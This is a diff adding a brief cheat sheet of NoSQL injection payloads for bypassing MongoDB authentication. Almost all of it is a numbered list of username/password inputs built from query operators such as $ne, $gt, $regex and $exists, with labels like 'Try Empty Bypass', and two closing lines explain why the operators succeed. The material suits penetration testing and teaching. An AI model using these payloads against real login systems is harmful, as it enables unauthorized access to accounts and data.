@@ -1,0 +1,38 @@
+NoSQL Injection is a security vulnerability where an attacker manipulates database queries in MongoDB by injecting malicious input (JSON operators like $ne, $gt) to bypass authentication
+
+username: admin
+password: {"$ne": null}
+
+🔹 2. Both Fields
+
+username: {"$ne": null}
+password: {"$ne": null}
+
+🔹 3. Using $gt
+
+username: {"$gt": ""}
+password: {"$gt": ""}
+
+🔹 4. Regex Match
+
+username: admin
+password: {"$regex": ".*"}
+
+🔹 5. Exists Check
+
+username: admin
+password: {"$exists": true}
+
+🔹 6. Try Empty Bypass
+
+username: admin
+password: {}
+
+🔹 7. Simple Trick
+
+username: admin
+password: {"$ne": "wrong"}
+
+
+check only that the password exists (not null), not whether it is correct =  {"$ne": null}
+It doesn’t verify the correct password, it only checks that a password exists (non-empty) = {"$gt": ""}
